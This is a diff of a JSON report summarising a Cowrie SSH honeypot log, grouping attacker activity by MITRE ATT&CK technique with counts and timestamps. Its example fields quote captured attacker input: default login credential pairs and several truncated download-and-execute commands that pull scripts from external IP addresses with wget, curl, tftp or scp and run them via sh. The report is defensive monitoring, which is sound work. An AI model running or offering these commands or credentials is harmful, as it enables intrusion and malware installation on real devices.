@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-27 07:04:36",
+  "generated": "2026-08-27 08:03:56",
   "totals": {
-    "commands": 215,
-    "login_failed": 1011,
-    "login_success": 45,
-    "sessions": 1110
+    "commands": 219,
+    "login_failed": 1148,
+    "login_success": 50,
+    "sessions": 1262
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1011,
+      "count": 1148,
       "examples": [
         "root / zlxx.",
         "root / root",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-08-27T00:04:34.466347Z",
-      "last": "2026-08-27T07:04:34.939110Z",
-      "unique_ips": 85
+      "last": "2026-08-27T07:57:50.775570Z",
+      "unique_ips": 95
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 45,
+      "count": 50,
       "examples": [
         "admin / 12345",
         "default / techsupport",
@@ -37,14 +37,14 @@
         "root / taZz@01"
       ],
       "first": "2026-08-27T00:03:05.692337Z",
-      "last": "2026-08-27T07:01:25.496654Z",
-      "unique_ips": 42
+      "last": "2026-08-27T07:59:32.043974Z",
+      "unique_ips": 47
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 40,
+      "count": 42,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -53,14 +53,14 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T06:46:30.011781Z",
-      "unique_ips": 10
+      "last": "2026-08-27T07:34:29.088850Z",
+      "unique_ips": 11
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 33,
+      "count": 36,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -69,8 +69,23 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T06:38:53.084317Z",
-      "unique_ips": 9
+      "last": "2026-08-27T07:34:29.635983Z",
+      "unique_ips": 10
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 6,
+      "examples": [
+        "uname -s -v -n -r -m",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "uname -a",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-08-27T06:14:53.381666Z",
+      "last": "2026-08-27T07:52:47.912364Z",
+      "unique_ips": 5
     },
     {
       "id": "T1033",
@@ -87,31 +102,31 @@
       "unique_ips": 5
     },
     {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 5,
-      "examples": [
-        "uname -s -v -n -r -m",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "uname -a",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-27T06:14:53.381666Z",
-      "last": "2026-08-27T06:46:30.011781Z",
-      "unique_ips": 4
-    },
-    {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 2,
+      "count": 4,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
       ],
       "first": "2026-08-27T06:38:53.088684Z",
-      "last": "2026-08-27T06:46:30.011781Z",
+      "last": "2026-08-27T07:34:29.088850Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-27T06:46:30.011781Z",
+      "last": "2026-08-27T07:34:29.088850Z",
       "unique_ips": 2
     },
     {
@@ -136,18 +151,6 @@
       ],
       "first": "2026-08-27T06:38:53.088684Z",
       "last": "2026-08-27T06:38:53.088684Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 1,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-27T06:46:30.011781Z",
-      "last": "2026-08-27T06:46:30.011781Z",
       "unique_ips": 1
     },
     {
